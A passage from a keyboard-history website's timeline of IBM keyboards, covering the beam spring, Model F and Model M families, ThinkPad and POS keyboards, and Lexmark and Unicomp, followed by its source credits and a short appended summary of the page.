The exact design is not solidified yet, and IBM would later patent two marketable derivatives in 1977 and 1983.24thSeptember1971[ASK]Richard Hunter Harris and Robert John Wolfram invent and patent the beam spring (switch button with snap mechanism) keyswitch. The design has a leaf spring that rests at a downwards bent position, which when force is applied, snaps to an inverted position. The movement lifts a capacitive fly plate away from a pad card sensor, which is interpreted as a key press.2ndAugust1972[8]The IBM Model B (beam spring) keyboard family is introduced with the IBM 3158 66-key Display Console Keyboard as IBM's fourth generation of keyboards.April1977[9]The IBM 5250 Information Display System debuts alongside the IBM System/34 midrange computer they were supposed to operate with as a family of twinaxial cabled terminals. At launch, the 5250 series included the IBM 5251 Display Station and 5252 Dual Display Station. The first keyboards of the 5250 family were the Model B-based 66-key and 83-key (pictured) IBM 5251 and 5252 Display Station Keyboards. The 83-key physical layout would later serve as the basis for the IBM System/23 Datamaster and Personal Computer Keyboards.May1977[10]The IBM Base Keyboard debuted in the form of the Model B-based 75-key and 87-key (pictured) IBM 3276 and 3278 Display Station Keyboards. The Base Keyboard was considered by IBM to be the direct predecessor to the Converged Keyboard design. The Base layout became somewhat of a standard for IBM, though perhaps competed with the IBM 5251/5252 layouts.August1977[ASK]Richard Hunter Harris patents the capacitive implementation of buckling springs.1978IBM begins developing the IBM System/23 Datamaster, and with it, the first Model F-based keyboard assembly.1978IBM United States opens the Charlotte, North Carolina plant and laboratory (plant 41). This plant became associated with the IBM Information Products Division and was known to manufacturer printers. From 1993, it likely had a peripheral involvement with the Model M keyboard family as many Model M-based IBM POS keyboards such as RPOS and MPOS will have Charlotte's plant code in their serial/ID numbers, implying at least a \"location of control\" relationship.17thJune1980[11]IBM announces the Displaywriter System, a modular diskette-based word processing system. At its core is the 6580 Displaywriter Display Station with its Displaywriter Display Station Keyboard Module (630X type Model B). The keyboard design is recycled from the IBM 5253/5254 Display Station, inheriting its internal speaker and likewise is available in either a 92 or 96 character variant.August1980After concluding the IBM System/23 Datamaster's development, IBM begins work on the IBM Personal Computer. This includes its keyboard, which was derived from the then-still-unreleased Model F-based IBM System/23 Datamaster Keyboard Assembly.July1981The IBM Model F (capacitive buckling spring) keyboard family is introduced with the IBM 5322 System/23 Datamaster's Keyboard Assembly as IBM's fifth generation of keyboards.12thAugust1981IBM launched the original Personal Computer, along with it, the IBM Personal Computer Keyboard. Also known as the \"Model F/XT\", the IBM PC Keyboard is the most common Model F keyboard variant.October1982[12]IBM launched the IBM 4700 Finance Communication System and notably its 4704 Display Station, debuting with a 50-key (472X-100 type Model F) keyboard at launch. This was followed by the 62-key (472X-200) (pictured) and 77-key (472X-300) keyboards in December 1982, and the 107-key (470X-400) keyboard in December 1983. In particular, the 62-key keyboard is notable as an early example of the now-popular 60% keyboard and Tsangan bottom row.8thMarch1983[13]IBM introduces the 3290 Information Panel, a 3270-family plasma screen terminal. The IBM Converged Keyboard debuts in the form of its \"unsaver\" Model F-based typewriter keyboard. They began to unify what were various fractured terminal keyboard lineages into a common platform, bringing their layouts a major step closer to modern ones.3rdOctober1983[ASK]Edwin T. Coleman, III patents the membrane implementation of buckling springs.18thOctober1983[14]IBM introduces the 4980 Display Station, a terminal for IBM Series/1 minicomputers with similar functionality to the earlier 4978. Its Model F-based 127-key keyboard was the first \"battleship\"-style IBM Converged Keyboard to become available.Q11984[15]The IBM 3270 Personal Computer becomes available. The 3270 PC is essentially an IBM Personal Computer XT with additional hardware and software to emulate an IBM 3270 terminal. The Model F-based IBM 3270 Personal Computer Converged Keyboard was IBM's first 122-key Converged Keyboard design and IBM's earliest host-connected keyboard.March1984[16]IBM introduces the PCjr, a small, low-cost PC designed for \"home and educational environments and for personal productivity applications.\" Its keyboard, the PCjr Cordless Keyboard, has 62 \"chiclet\" style keys, rubber-dome keyswitches and infrared connectivity. The PCjr would turn out to not be very successful, and its original keyboard design considered to be one of IBM's worst.14thAugust1984[ASK]IBM launched the Personal Computer AT (PC/AT), along with it, the IBM Personal Computer AT Keyboard. Also known as the \"Model F/AT\", this would be the last entirely new Model F keyboard design.September1984IBM introduces the revised PCjr Cordless Keyboard to address major complaints regarding the original \"chiclet\" style design. It still has 62 keys and infrared connectivity, but it now has more traditional style keys and nomenclature is printed on the keys instead of an overlay surrounding them.16thOctober1984[ASK]IBM announces the Wheelwriter 3, Wheelwriter 5 (pictured, keyboard of), and Quietwriter 7 electronic typewriters under the moniker IBM Selectric System/2000. Via their keyboard assembly designs, the IBM Model M (then-only membrane buckling spring) keyboard family debuts as IBM's sixth generation of keyboards.21stMay1985[17]IBM announces the PC/AT-based 7531 and 7532 Industrial Computers. The IBM Enhanced Keyboard via the IBM 7531/7532 Industrial Computer Keyboard makes its first official appearance. The Enhanced Keyboard introduces the full-size/100% form-factor and the basis of the ANSI and ISO physical layouts that remain the standard today.18thJune1985[18]IBM announces the 3161 and 3163 ASCII Display Stations, serial-based terminals in the IBM 3101 lineage that were capable of emulating various third-party terminals. They sported the first terminal-specific IBM Enhanced Keyboards, which typically have an extra key over ANSI and ISO PC-style Enhanced Keyboards, and ASCII-style ones like 316X's often uniquely have line drawing symbols on their numeric keypads.September1985[ASK]The first 122-key Model M Converged Keyboard (also known as the IBM Model 1A) becomes available as an option for the IBM 3205 Color Display Console. This continues the Converged Keyboard line from the Model F era, eventually bringing the form-factor to many existing and new IBM Display Stations, consoles, and even host-connected PCs. Five unique types will be introduced by the 2000s.Q41985[19]IBM introduces the 6770 Wheelwriter System and 6780 Quietwriter System electronic typewriters, both available in a Function Pack 20 (System/20) and Function Pack 40 (System/40) version. Both used a unique Movable Keyboard, a Model M-based keyboard with an AT-style physical layout, a removable 80-character LCD and sits in an adjustable cradle.1986[20]IBM Mexico opens the Guadalajara, Jalisco plant (plant 78 or \"IEP\"). This plant was specifically made for producing personal computers and related peripherals for the Latin American market. IBM Personal System/2 Enhanced Keyboards were produced there between 1987 and 1995, with such keyboards affectionately known as a \"Modelo M\", referencing their Spanish-language rear labels.8thJanuary1986[21]IBM announces the 4680 Store System, its first POS solution based around PC-based terminals. At launch, it included the 4683 POS Terminal, IBM 5170 Model 839 or 5170 Model 899 Personal Computer AT/Store Controller, and the 4680 50-Key Modifiable Keyboard (pictured). The keyboard is made by SMK and uses SMK discrete rubber dome keyswitches.October1986The IBM Space Saving Keyboard (SSK) debuted in the form of the IBM 3162 ASCII Display Station Short Keyboard. No modern photos of it are available but it has been described to be like SSKs that came later.16thDecember1986[22]IBM announces the Model M-based 4680 POS Alphanumeric Keyboard for the IBM 4683 and later 4684 POS Terminals. Its complete sub-assembly is based on the IBM 6770/6780's, but with a new cover set, POS-specific features and RS-485 electronics. It also has a more traditional AT-style layout, though with some added relegendable keys. It is the only buckling-spring IBM POS keyboard known.17thFebruary1987[23]The IBM Model 1B keyboard makes its original debute as an option for the IBM 3192 Display Station models C and D. Model 1Bs take on the same physical layout and form-factor as the 104-key Model F Converged Keyboards but they are not based on existing IBM keyboard technology, instead using Micro Switch ST series rubber dome keyswitches. It's believed the \"Quiet Touch Keyboard\" term originated as a name for 1Bs.April1987[ASK]IBM introduces the Personal Computer/2 (PS/2) series of PCs. With them, the IBM PS/2 Enhanced Keyboard that would become the most common buckling-spring Model M variant and possibly one of the most famous keyboards of all time.June1987[ASK]IBM introduces the 3151 ASCII Display Station, a cheaper follow-up to the IBM 316X series and likewise an IBM 3101 lineage terminal capable of emulating various third-party terminals. 3151 received an Enhanced Keyboard variant similar to the 316X keyboard but with updated branding and cable.August1987[ASK]IBM brought its Model M Space Saving Keyboard design to the IBM Personal System/2 family, starting with the IBM PS/2 Model 25 models 001 and 004. The PS/2 SSK is the first modern PC tenkeyless keyboard and used a layout based on the Enhanced layout but with a numeric keypad overlaid across various alphanumeric keys.31stDecember1987[ASK]IBM introduces the 4680 POS Matrix Keyboard for 4683 and 4684 POS Terminals. It is one of IBM's most functional keyboards, purposely designed for \"applications requiring a large number of pre-defined keys.\" It has a manger's keylock and 139 keys, of which 126 comprise its main relegendable area. It is made by Key Tronic and uses Key Tronic capacitive foam and foil (tactile variant) keyswitches.18thMarch1988[ASK]IBM introduces the Personal System/2 Screen Reader as the inaugural product of the IBM Independence Series range, and was a pioneering screen reader system designed to help people with hard or lack of sight access a PC. The IBM Screen Reader Keypad (SRK) is also introduced as the peripheral component for this system.20thJune1989[24]IBM introduces the first InfoWindow Display Station types, 3471 and 3476. The IBM InfoWindow Display Station family further converges the 3270 and 5250 terminal families under more unified branding and outwardly design language despite their inherit cabling, protocol and layout nomenclature differences.29thDecember1989[25]IBM introduces the 4680 50-Key Modifiable Keyboard/Operator Display for 4683 and 4684 POS Terminals. It is based on the existing IBM 4680 50-Key Modifiable Keyboard, likewise made by SMK and using SMK discrete rubber dome keyswitches but now sporting a tilting LCD.28thAugust1990[26]IBM announces the Personal System/1 (PS/1) series of PCs, intended as more affordable and easier to use alternatives to IBM PS/2s. With them, the first IBM Selectric Touch Keyboards (Model M2) become available. M2 is a lower-cost, lower-profile and lightweight alternative to the IBM Enhanced Keyboard.28thSeptember1990[27]IBM introduces the 4680 ANPOS Keyboard for 4683 and 4684 POS Terminals. It has 115 keys and an integrated manager's keylock. Like previous 4680 keyboards, it is made by SMK and uses SMK discrete rubber dome keyswitches.9thOctober1990[28]Joseph E. Jasinski, Charles H. Lingle, Richard F. Pollitt and David W. Shuman patents a combined, reversible ball mouse and trackball device ultimately used for the IBM Personal System/2 L40 SX notebook computer. This device was marketed the original IBM TrackPoint.29thNovember1990[ASK]Edwin J. Selker and Joseph D. Rutledge patent the concept of a pointing stick, which would eventually be implemented on IBM products as the TrackPoint II, III and IV pointing sticks and become a hallmark feature of ThinkPad laptops.26thMarch1991[29]The IBM Model M keyboard family is expanded to include IBM buckling sleeve based keyboards upon the introduction of the IBM Personal System/2 Model L40 SX notebook computer and its Model M3 keyboard assembly and optional numeric keypad. Also available for L40 SX as an option was the original IBM TrackPoint design (combined mouse and trackball).27thMarch1991IBM Information Products Corporation is divested to form Lexmark International. Lexmark inherited IBM United States' keyboard, printer and typewriter manufacturing operations and facilities in Boulder, Colorado and Lexington, Kentucky (plant 11).11thJune1991IBM announces the Select-a-Keyboard scheme as a way of allowing IBM PC customers to change the bundled keyboard at the time of purchase for no additional charge. The options available under this scheme were mostly from the Model M family.Q41991[ASK]The IBM Space Saver Keyboard (Model M4) enters production around this time. It is essentially just an IBM Personal System/2 L40 SX Keyboard Assembly (M3) placed in its own cover set with a PS/2 controller card. It is notable for being the first desktop keyboard with IBM buckling sleeves.February1992[ASK]The Lexmark Classic Touch Keyboard with 16mm Trackball (Model M5-1) and Classic Touch Keyboard with 25mm Trackball (Model M5-2, pictured) begin appearing in magazines. Model M5s are variants of the Lexmark Classic Touch Keyboard and IBM Enhanced Keyboard with an integrated trackball assembly and at least four mouse buttons (a pair of standard click buttons and a pair of stepped-click buttons). M5-1 has a 16mm trackball positioned above the keyboard's arrow keys, but M5-2 has a 25mm trackball above the LED lock-light overlay. IBM-branded versions will appear later.25thFebruary1992[30]IBM introduces the Personal System/2 CL57 SX notebook computer, IBM's first laptop to have a colour display. It also introduces the buckling-sleeve Model M6 keyboard (the original Type 1 variant), an evolution of the earlier IBM PS/2 L40 SX's M3 with an updated actuation method and easier keycap removal.March1992[ASK]Lexmark introduces the AR10 series of notebook computers for ODM purposes and eventually for their own Lexbook brand. They all sport the Lexmark Notebook Keyboard with 16mm Trackball, a Type 2 buckling-sleeve Model M6 keyboard with an integrated trackball in the bottom-right and two mouse buttons inserted in between Ctrl and Alt. Type 2 M6s are notable for introducing a 7-row physical layout to the Model M family, which would soon be refined and popularised by the then-upcoming ThinkPads as the classic ThinkPad layout.16thOctober1992[ASK]IBM introduces the ThinkPad 700 series notebook computers, typically considered to be the first 'true' ThinkPad (a black, bento-box styled laptop with a red pointing stick). In particular, the 700 series introduces the Type 3 variant of the buckling-sleeve Model M6 keyboard and the TrackPoint II pointing stick.1stJune1993[31]IBM announces the 4693 and 4694 POS Terminals. To go with them, IBM also introduces the Retail POS (RPOS) series of buckling-sleeve Model Ms (M7, M7-1, M8, M9 and M11). RPOS keyboards are derived from a common platform and usually made by a single OEM at a given time, which contrasts the IBM 4680 era's fractured keyboard ecosystem made by IBM itself, SMK or Key Tronic.30thJune1993[32]IBM introduces the Personal System/2 E (PS/2 E), the first Energy Star-compliant PC. To go with it, the pearl-white IBM Quiet Touch Keyboard with TrackPoint II (Model M4-1, also known as IBM Space Saver Keyboard with TrackPoint II) is also introduced. M4-1 is an extension of M4, but with an integrated TrackPoint II pointing stick, and was in fact the first non-laptop IBM keyboard with such a device. A raven black version called the IBM ThinkPad Space Saver Keyboard with TrackPoint II would later be introduced.Q31993[33]The IBM Easy OPTIONS 101-Key Extended Keyboard (Model M1, KB570) begins appearing in marketing. M1 is a variant of the M2 Selectric Touch Keyboard with an AT-style DIN plug that was sold as a standalone product rather than being bundled with a system.15thJuly1993[30]IBM introduces the ThinkPad 500 series monochrome subnotebooks. 500 in turn introduces the Type 4 variant of the buckling-sleeve Model M6-1 keyboard, which compared to all most other M6/M6-1 types had a much compressed layout, smaller key unit sizes, and (on average) lower-gauge sleeves to suit the 500-series' very small size.8thSeptember1993[34]IBM introduces the IBM ThinkPad 750 series notebook computers. 750 series in turn introduces the Type 5 variant of the buckling-sleeve Model M6-1 keyboard, a revision of the Type 3 design that most notably sports an outer frame and hinges to allow them to mount to the host laptop to act as its inner cover and lifts to provide access to major system components.November1993[ASK]The Lexmark Classic Touch Keyboard with Integrated Pointing Stick, the first of the Model M13s, begins appearing in Lexmark's marketing in magazines. M13s are variants of the Lexmark Classic Touch Keyboard and IBM Enhanced Keyboard with an integrated pointing stick and two mouse buttons. Lexmark self-branded M13s use an FSR-based pointing stick, whereas IBM's usually use TrackPoint II.28thFebruary1994[26]IBM announces the OPTIONS by IBM brand to offer \"hundreds of peripheral add-ons, add-ins and system enhancements for both IBM and non-IBM industry standard systems, to satisfy a wide variety of personal computing needs.\" Upon launch, the brand included a version of the Model M PS/2 Enhanced Keyboard and Model M13 TrackPoint II Keyboard.May1994[ASK]The Winbook XP series of notebooks begins appearing in marketing. They sported Lexmark-produced keyboards, which happen to be the earliest known examples of the Type 6 buckling-sleeve Model M6-1 variant. Type 6s are similar to Type 4 in that they are more compacted than the other types, but Type 6 retains standard sleeve gauges and key unit sizes and makes less layout compromises.3rdOctober1994Robert C. Barrett, Robert S. Olyha, Jr. and Joseph D. Rutledge patents a formula for a negative inertia transfer function that can be used to help pointing sticks to counteract the feeling of sluggishness (i.e., having inertia). It was implemented in TrackPoint III's and TrackPoint IV's firmware, making them more performant with modern, high-resolution displays compared to TrackPoint II. For ThinkPads, it first appeared on the IBM ThinkPad 755CD.15thNovember1994[35]IBM introduces the Adjustable Keyboard and optional numeric keypad attachment (Model M15) under the OPTIONS by IBM brand. It is unique for being an IBM keyboard that is a split ergonomic design with extensive form customisability thanks to its elaborate feet. Lexmark also introduced a self-branded version called the Select-Ease Keyboard at some point. M15 was also the last numbered Model M variant to be introduced.30thNovember1994[ASK]IBM introduces the TrackPoint II Keyboard (Black) (Model M13) under the OPTIONS by IBM brand. Whilst it is only a visual (raven black) variant of the existing IBM-branded M13, it will still become one of IBM's most iconic specific Model M variants.6thMarch1995[36]IBM introduces the ThinkPad 701C and 701Cs notebook computers, IBM's novel solution to reducing a laptop's overall footprint in an era of typical only small displays available. Its integrated IBM TrackWrite Keyboard (also known as the \"butterfly keyboard\") is able to slide so it can compact itself when the laptop is closed and expand when it is opened. The keyboard overall resembles a Model M6 or M6-1, but it is produced by Key Tronic using their own flavour of buckling-sleeve keyswitches. The 701C series went on to win many design awards.4thDecember1995Lexmark announces it will be ending its keyboard manufacturing business by April 1996 to focus on printers. IBM agreed to purchase from Lexmark $6.5 million worth of \"certain keyboard assets, tooling, equipment, manufacturing information and licenses.\" Maxi Switch bought from Lexmark some manufacturing rights for IBM keyboards, patents (including one related to buckling springs), and assets for Lexmark Select-Ease Keyboards (Model M15) and rubber dome keyboards.Q11996[ASK]Apple introduces the Newton OS 2.0 for its Newton MessagePad series personal digital assistants that promises better handwriting recognition and supports an external keyboard. The Apple Newton MessagePad Keyboard (model X0044) is launched to coincide with this, but it is especially interesting since it is derived from the IBM ThinkPad 500's Type 4 Model M6-1 buckling-sleeve keyboard assembly and is presently the only known Apple-branded Model M.April1996Lexmark exits the keyboard business. This resulted in the late Neil Muyskens (a former IBM and Lexmark engineer) founding Unicomp as Lexmark's keyboard business successor, continuing to produce various Model M variants in Kentucky, USA to this day, originally at 510 Henry Clay Blvd, Lexington, Kentucky 40505.5thNovember1999[31]IBM introduces the 4820 SurePoint Solution Flat Panel Display, an attachment originally for IBM 4694 POS Terminals. The display in turn could support a 32-key keypad attachment that was originally called the IBM SurePoint 4820 Monitor Keypad and MSR Extension. This keypad is considered to be the beginning of the Pre-Modular POS (PMPOS) series of buckling-sleeve Model Ms. 4 types of 4820-style keypads would eventually be introduced.2000IBM relinquishes its in-house keyboard production capability after IBM United Kingdom's Greenock, Scotland plant (plant 55) stops producing Model M keyboards.November2000[ASK]Unicomp introduces the EnduraPro, a modification of the IBM Japanese Keyboard/TrackPoint II (model 5576-C01) that supports the ANSI layout and the ISO layout, removes its large rotating foot and makes use of the Lexmark-Unicomp FSR pointing stick.2002[37]IBM introduces the original Compact ANPOS Keyboard (CANPOS). It is a 133/134-key keyboard with an integrated pointing device and optionally an MSR that manages to pack all this functionality into a form-factor that is roughly as wide as a TKL. It is considered to be within the PMPOS series of buckling-sleeve Model Ms.March2003[ASK]IBM introduces the first SK-8835 (USB Keyboard with UltraNav, pictured) and SK-8845 (USB Travel Keyboard with UltraNav) releases, in turn the first models of the SK-8835/SK-8840/SK-8845 family of discrete keyboards with a classic ThinkPad layout and a Synaptic TouchStyk pointing stick.October2003[ASK]IBM introduces the 3494 Track Pointer Keyboard for the TotalStorage 3494 Enterprise Automated Tape Library. It is a variant of the Unicomp On-The-Stick (Model M13) that replaces an earlier Model M5-2 3494 Track Ball Keyboard. Because of its Unicomp base, it is the only known IBM-branded M13 to use an FSR-based pointing stick instead of a TrackPoint. It is the latest known IBM-branded buckling spring keyboard to be introduced.2004Brandon Ermita begins ClickyKeyboards (ClickyKeyboards.com) as a way of preparing for upcoming online academic database projects for Princeton University by documenting Model M keyboards. This will soon grow into a passion and business for restoring and selling Model M keyboards that is still going today, having since sold thousands of keyboards and became the most well-known of such businesses.10thMarch2004[ASK]IBM introduces the SK-8840 (IBM PS/2 Travel Keyboard with UltraNav), a new PS/2 member for the SK-8835/SK-8840/SK-8845 family based on the existing SK-8845.1stMay2005Lenovo acquires IBM Personal Computing Division, gaining its ThinkPad brand, access to the SK-8835/SK-8840/SK-8845 keyboard family, various other relevant IP and personnel.November2006Unicomp introduces the SpaceSaver, a variant of the Model M-based EnduraPro without a pointing stick and two mouse buttons.29thAugust2008IBM introduces the Modular POS (MPOS) series of buckling-sleeve Model Ms as successors to RPOS, finally shaking up IBM POS keyboard design for the first time since 1993. MPOS at this point includes the IBM Modular 67-Key POS Keyboard, IBM MANPOS Keyboard and IBM MCANPOS Keyboard. The \"modular\" in their names refers to how some of the keyboard's extra functionality is user removable and replaceable.April2011[38]Unicomp introduces the SpaceSaver M, an Apple Mac OS X (now simply macOS) centric version of the Model M-based SpaceSaver. The original SpaceSaver is renamed \"SpaceSaver PC\".22ndApril2011[ASK]Soarer's Converter firmware debuts when Soarer starts a geekhack thread on the subject. Originally for Teensy-based microcontroller units, it makes using IBM PC/XT and terminal compatible keyboards much easier than before. When eventually paired with Pro Micros and custom solutions such as orihalcon's and tinkerBOY's cables became available, it became the most popular of such firmware. It will go on to win \"best input device mod\" in Deskthority Awards 2012.23rdAugust2011[39]Lenovo introduces the Android-based ThinkPad Tablet (types 1838 and 1839). To go with it, the Lenovo ThinkPad Tablet Keyboard Folio Case (model 0B33533) is also introduced and is the first device with an Optical TrackPoint.27thSeptember2011[ASK]The IBM Modular 67-Key POS Keyboard with LCD Display is introduced as the fourth and final member of the MPOS series of buckling-sleeve Model Ms, replacing the RPOS-era Model M8 and thus sometimes known as the \"M8-e\". It is presently the latest known IBM buckling sleeve keyboard design.April2012[ASK]Unicomp renames the Model M-based SpaceSaver PC to its current name Ultra Classic.June2012[ASK]Lenovo makes the Precision Keyboard the standard keyboard design for Lenovo ThinkPads going forward, starting with the xx30 generation. Precision (also known as the \"chiclet-style\" or 6-row keyboard) is a derivative of AccuType Keyboard that was previously tested on some specific ThinkPads before now mostly laying to rest the 7-row keyboard classic ThinkPad layout across the board.1stAugust2012Toshiba TEC acquires IBM Retail Store Solutions, creating Toshiba Global Commerce Solutions (TGCS). TGCS inherited IBM's last remaining portion of the Model M keyboard family and now remains the only company marketing IBM buckling sleeve keyboards.2013[ASK]IBM introduces the SK-8845CR variant of the SK-8835/SK-8840/SK-8845 family of ThinkPad-style discrete keyboards, uniquely omitting a TouchPad compared to the previous variants. This is the latest known keyboard release with a classic ThinkPad layout.1stOctober2014Lenovo acquires IBM x86 Server Business, receiving IBM's System x, BladeCenter and Flex System blade servers and switches, x86-based Flex integrated systems, NeXtScale and iDataPlex servers and associated software, blade networking and maintenance operations.February2015Unicomp introduces the Sun Unix SpaceSaver, a version of the Model M-based Ultra Classic and SpaceSaver M with a layout tailored to Sun Unix usage.1stJuly2015[ASK]Joe Strandberg (known as Ellipse on deskthority and geekhack) founds Model F Labs and begins the Brand New Model F Keyboards project. The original goal is to recreate the capacitive buckling spring and the 472X-200 type and 472X-300 type Model Fs with modernised electronics and available at an affordable price. By the mid 2020s, the project will expand to include reproduction beam spring keyboards and Model M-inspired reproduction Model F keyboards.23rdOctober2017Unicomp is acquired by Video Display Corporation (VDC) as an \"opportunity to develop, market and sell Tempest keyboards for its cyber security division\".16thJanuary2018Unicomp is reincorporated from \"Unicomp, Inc.\" to \"Unicomp GA, LLC\" following its purchase by VDC.29thMarch2020[ASK]Unicomp introduces the New Model M, the first entirely new buckling-spring Model M variant since the '90s. Whilst it doesn't revolutionise the typical Model M internal mechanical and electronical design, its cover set is produced with new tooling and represents an upward shift in quality over other contemporary Unicomp keyboards.September2020Demolition of IBM United Kingdom's former Greenock, Scotland plant (plant 55) is completed.24thFebruary2021[ASK]Unicomp introduces the Mini Model M, a tenkeyless counterpart to the New Model M. Its cover set is likewise produced with new tooling, but it also sports new membrane assembly design that allows larger key combinations in various scenarios and controller card design that sports a lockable USB port.November2022[40]Lenovo introduces the ThinkPad X1 Fold 16 Gen 1 foldable computer and its optional Bluetooth TrackPoint Keyboard and Stand (model TKBBTDU811). TKBBTDU811 is the first Lenovo removable keyboard with an integrated Sensel haptic trackpad.24thApril2024Unicomp completes a factory move from 510 Henry Clay Blvd, Lexington, Kentucky 40505 to 550 W 4th St #125, Lexington, Kentucky 40508.SourcesASK. Admiral Shark's Keyboards original content. License/note: CC BY-NC-SA 4.0.Mr. Haelscheir - donated photo.Flygvapenmuseum - File:IBM Model A typewriter (1).jpg [accessed 2024-08-01]. License/note: CC BY-SA 4.0 (cropped).IBM - IBM 024 Card Punch 026 Printing Card Punch Customer Engineering Manual of Instruction (#22-8319-0) [accessed 2025-03-29]. License/note: photos used under fair dealing.Norsk Teknisk Museum - File:IBM Model B typewriter (1).jpg [accessed 2024-08-01]. License/note: CC BY-SA 4.0 (cropped).Tekniska museet - File:IBM Model C Executive (1).jpg [accessed 2024-08-01]. License/note: CC BY-SA 4.0 (cropped).Norsk Teknisk Museum - File:IBM Model D Executive (1) (cropped).jpg [accessed 2024-08-01]. License/note: CC BY-SA 4.0 (cropped).snuci - File:IBM 3277 typewriter keyboard - keyboard top.JPG [accessed 2022-12-07]. License/note: public domain.うぃき野郎 - File:IBM System370 model 138.jpg [accessed 2023-12-09]. License/note: CC BY-SA 4.0 (cropped). Museo de Informática - R/Evolución 2010 | Equipos expuestos en UTN [accessed 2023-01-19]. License/note: CC BY-SA 3.0.TheMK#1822 - donated photos. License/note: CC-BY-NC-SA 4.0.IBM - IBM Displaywriter System General Information Manual (#G544-0851-5) [accessed 2023-12-06]. License/note: document archived by bitsavers.webwit - Index of /input/ibm_misc [accessed 2023-01-06]. License/note: public domain.Computerworld - 18 Apr 1983 [accessed 2023-08-05]. License/note: accessed via Google Books, photo used under fair dealing.Wazrach @ deskthority - IBM 4980 Model F Battleship (DONE) [accessed 2023-08-03]. License/note: permission to use photos requested and given via DMs.IBM - An Introduction to the IBM 8100 Information System (#GA27-2875-7) [accessed 2023-01-16]. License/note: document archived by bitsavers, photos used under fair dealing.Rik Myslewski - . License/note: public domain.email donations - donated photo.Wyatt8740  - File:Ibm3161 1.jpg [accessed 2023-01-23]. License/note: public domain.Recycled Goods, Inc. - IBM 6770 Wheelwriter System/40 Typewriter F.P. 40 - Word Processor *NO RIBBON* [accessed 2023-02-26]. License/note: used under fair dealing.eBay - photos saved from past listings & used under fair dealing.ASK Keyboard Archive Photos - P/N 4783896 (198X, SMK) [accessed 2025-03-28]. License/note: photos archived from Recycled Goods, used under fair dealing.taylorswiftttttt - IBM Model M AT - 76X0035 - POS Keyboard [accessed 2022-04-09]. License/note: permission requested and explicitly given via direct correspondence.snuci - File:IBM 73x3832 Unsaver keyboard front.jpg [accessed 2024-10-02]. License/note: public domain.WorthPoint - Vintage IBM InfoWindow 3476 Display Station Monitor w/ Keyboard *See Desc* [accessed 2023-09-25]. License/note: photos saved from WorthPoint, used under fair dealing.IBM - IBM 4693/4694 Store Systems Hardware Service Manual for Point-of-Sale Input/Output Devices [accessed 2022-04-24].Brandon @ clickykeyboards.com - photo used with attribution [accessed 2024-04-21]. License/note: https://deskthority.net/wiki/Help:Contents#Copyright.themk - donated photo. License/note: CC BY-NC-SA 4.0.IBM - Combined mouse and trackball [accessed 2025-03-21]. License/note: figures used under fair dealing.D. E. Larsso - File:IBM PS2 L40SX.jpg [accessed 2021-12-04]. License/note: CC BY-SA 4.0.Jack @ laptop.pics - donated photos.IBM - ftp://public.dhe.ibm.com [accessed 2025-03-05]. License/note: archived from IBM public FTP & used under fair dealing.Brandon @ clickykeyboards.com - 1997 IBM model M4-1 keyboard with trackpoint (84H8470) 18-JUL-1997 and external numpad (84H8537) + spare keyboard assembly [accessed 2022-08-20]. License/note: https://deskthority.net/wiki/Help:Contents#Copyright.WorthPoint - 1994 IBM Easy Options M1 Computer Keyboard 60G3570 WP1 M Clicky Buckling PC PS2 [accessed 2024-05-07]. License/note: photos saved from WorthPoint, used under fair dealing.ASK Keyboard Archive - P/N 66G0121 (1994, Lexmark) [accessed 2023-06-04]. License/note: photos saved from volatile eBay listing, used under fair dealing.P. Zwettler - M15 - IBM 13H6689 [accessed 2024-09-19]. License/note: All Rites Reversed.Richard Sapper - ThinkPad 701 [accessed 2025-03-25]. License/note: copyright of Richard Sapper, used under fair dealing.doomsday_device - donated photos.Unicomp - SpaceSaver M (Mac or Apple) [accessed 2022-11-08]. License/note: retrieved via Wayback Machine (2011-07-22 capture).DZ-World @ AliExpress - ThinkPad Tablet 1838 1839 Booklet Keyboard Leather Folio Case w/ US English keyboard USB Port 00HM470 SM10E37708 03X6354 04W2157 [accessed 2024-02-18]. License/note: photos saved from AliExpress listing, used under fair dealing, retrieved via Wayback Machine (2024-02-18 snapshot).Lenovo - Parts - X1 Fold 16 Gen 1 (Type 21ES, 21ET) Laptop (ThinkPad) - Type 21ES [accessed 2023-11-08]. License/note: photos used under fair dealing.Admiral Shark's Keyboards logoAdmiral Shark's KeyboardsHomeSitemapTerms of Use, Use of JavaScript & DisclaimersOriginal text & images licensed under CC BY-NC-SA 4.0Support ASK on Ko-fiDeveloped in WalesPowered by Debian",
    "summary": {
      "en": "The text provides a detailed timeline of IBM's keyboard history, highlighting key developments from the 1890s to the present. Here are the main points:\n\n1. **Origins and Early Innovations**: The timeline begins with Herman Hollerith's founding of the Tabulating Machine Company in the 1890s and his patent for the first keypunch in 1901. This laid the groundwork for IBM's future keyboard innovations.\n\n2. **Company Evolution**: IBM was formed in 1924 from the merger of several companies, becoming a leader in typewriters and keyboards. Over the decades, IBM acquired other companies and introduced various keyboard technologies.\n\n3. **Key Releases**: Significant milestones include:\n   - The introduction of electric typewriters in the 1930s.\n   - The development of the first generation of keyboards in 1949.\n   - The launch of the Model F and Model M keyboards in the 1980s, which became iconic for their design and functionality.\n\n4. **Technological Advancements**: Various keyboard types were developed, including capacitive buckling spring designs and membrane keyboards. Innovations like the TrackPoint pointing stick were introduced in ThinkPad laptops.\n\n5. **Corporate Changes**: In the 1990s, IBM divested its keyboard manufacturing to Lexmark, which later transitioned to Unicomp, continuing to produce Model M keyboards.\n\n6. **Recent Developments**: The timeline concludes with Unicomp's introduction of new keyboard models in the 2020s and Lenovo's continuing evolution of keyboard designs in its ThinkPad series.\n\nOverall, the timeline captures IBM's significant influence on keyboard technology and design over the past century.",
